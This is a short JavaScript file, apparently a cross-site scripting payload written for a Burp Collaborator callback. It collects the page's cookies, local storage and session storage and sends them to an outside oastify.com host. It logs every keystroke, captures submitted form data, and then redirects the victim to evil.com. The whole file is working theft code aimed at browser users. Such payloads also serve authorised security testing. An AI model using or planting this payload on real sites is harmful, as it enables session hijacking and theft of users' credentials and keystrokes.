// Collect Cookies, Local Storage, and Session Storage
var cookies = document.cookie;
var localStorageData = JSON.stringify(localStorage);
var sessionStorageData = JSON.stringify(sessionStorage);

// Send Data to Burp Collaborator
var burpURL = "https://mh7587gmzgcs1acch9zst61o7fd618px.oastify.com";
new Image().src = burpURL + "/?cookie=" + encodeURIComponent(cookies) + 
                  "&localStorage=" + encodeURIComponent(localStorageData) + 
                  "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
                  "&referrer=" + encodeURIComponent(document.referrer);

// Keylogger
document.addEventListener("keydown", function(event) {
    new Image().src = burpURL + "/?key=" + encodeURIComponent(event.key);
});

// Form Stealer
document.addEventListener("submit", function(event) {
    var formData = new FormData(event.target);
    var data = "";
    for (var pair of formData.entries()) {
        data += pair[0] + "=" + pair[1] + "&";
    }
    new Image().src = burpURL + "/?form=" + encodeURIComponent(data);
});

// Redirect Victim
setTimeout(function() {
    window.location.href = "https://evil.com";
}, 3000);
